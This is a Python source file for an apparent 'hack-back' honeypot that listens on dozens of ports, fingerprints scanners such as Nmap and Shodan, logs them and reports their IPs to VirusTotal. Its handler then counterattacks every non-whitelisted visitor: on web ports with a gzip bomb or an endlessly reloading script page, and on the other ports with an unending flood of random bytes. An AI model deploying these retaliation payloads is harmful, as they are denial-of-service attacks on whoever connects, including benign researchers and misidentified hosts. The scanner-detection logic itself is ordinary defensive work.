import socket
import threading
import time
import os
import binascii
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter

# CONFIGURACIÓN HELL v2.3.0: FORENSICS & SCANNER DETECTION
HOST = '0.0.0.0'
WEB_PORTS = [80, 443, 8080, 8081, 8082, 8090, 8443, 9200]
LETHAL_PORTS = [2222, 3389, 4455]
RAW_PORTS = [23, 445, 1433, 2323, 2525, 3306, 6379, 1337, 2375, 8125, 5060, 5900, 110, 5555]

PORTS = WEB_PORTS + LETHAL_PORTS + RAW_PORTS
GZIP_BOMB_PATH = "payloads/bomb.gz"
LOG_FILE = "logs/hell_activity.log"

VT_KEY = os.getenv("VT_API_KEY", "")
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        os.makedirs("logs", exist_ok=True)
        self.reporter = VirusTotalReporter(VT_KEY)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"[💀] HELL CORE v2.3.0: Vigilando {len(PORTS)} puertos con análisis forense.")

    def detect_scanner(self, data):
        """Identifica la herramienta de escaneo basada en firmas de payload."""
        data_str = data.decode('utf-8', errors='ignore')
        data_hex = binascii.hexlify(data).decode('utf-8')

        # Firmas de User-Agents y Headers
        if "nmap" in data_str.lower(): return "Nmap Scripting Engine"
        if "masscan" in data_str.lower(): return "Masscan"
        if "zgrab" in data_str.lower(): return "ZGrab Scanner"
        if "censys" in data_str.lower(): return "CensysInspect"
        if "shodan" in data_str.lower(): return "Shodan Bot"
        
        # Firmas binarias comunes
        if data_hex.startswith("474554202f2048545450"): return "Generic HTTP Bot"
        if data_hex.startswith("5353482d322e30"): return "SSH Brute-forcer"
        if "000001000001000000000000" in data_hex: return "Nmap DNS Version Probe"
        
        if not data: return "TCP Stealth Scan (No Payload)"
        return "Unknown Bot / Custom Script"

    def log_event(self, ip, port, local_port, scanner, payload):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        hostname = "N/A"
        try: hostname = socket.gethostbyaddr(ip)[0]
        except: pass

        # Payload resumido para el log
        payload_preview = binascii.hexlify(payload[:32]).decode('utf-8') + "..." if payload else "None"
        
        log_entry = (
            f"[{timestamp}] [HIT] {ip} ({hostname}) -> Port:{local_port}\n"
            f"    └─ Scanner: {scanner}\n"
            f"    └─ Remote Port: {port}\n"
            f"    └─ First Bytes: {payload_preview}\n"
        )
        
        with open(LOG_FILE, "a", encoding='utf-8') as f:
            f.write(log_entry)
        print(f"[*] {scanner} detectado desde {ip} en puerto {local_port}")

    def handle_client(self, client_socket, addr, local_port):
        if addr[0] in self.whitelist:
            client_socket.close(); return

        try:
            client_socket.settimeout(2.0)
            # Capturar los primeros bytes para análisis
            try:
                payload = client_socket.recv(1024)
            except:
                payload = b""

            scanner_type = self.detect_scanner(payload)
            self.log_event(addr[0], addr[1], local_port, scanner_type, payload)
            
            # Reportar a VirusTotal
            self.reporter.report_ip(addr[0])

            # --- Ejecutar Contraataque ---
            if local_port in WEB_PORTS:
                if os.path.exists(GZIP_BOMB_PATH):
                    with open(GZIP_BOMB_PATH, "rb") as b: bomb_data = b.read()
                    header = f"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nContent-Length: {len(bomb_data)}\r\n\r\n"
                    client_socket.send(header.encode() + bomb_data)
                else:
                    client_socket.send(b"HTTP/1.1 200 OK\r\n\r\n<script>while(1)location.reload();</script>")

            elif local_port in LETHAL_PORTS:
                while True:
                    client_socket.send(os.urandom(1024))
                    time.sleep(0.001)
            else:
                while True:
                    client_socket.send(os.urandom(4096))
                    time.sleep(0.1)

        except: pass
        finally:
            try: client_socket.close()
            except: pass

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, port))
            server.listen(100)
            while True:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port), daemon=True).start()
        except: pass

    def start(self):
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True:
            try: time.sleep(1)
            except KeyboardInterrupt: break

if __name__ == "__main__":
    HellServer().start()
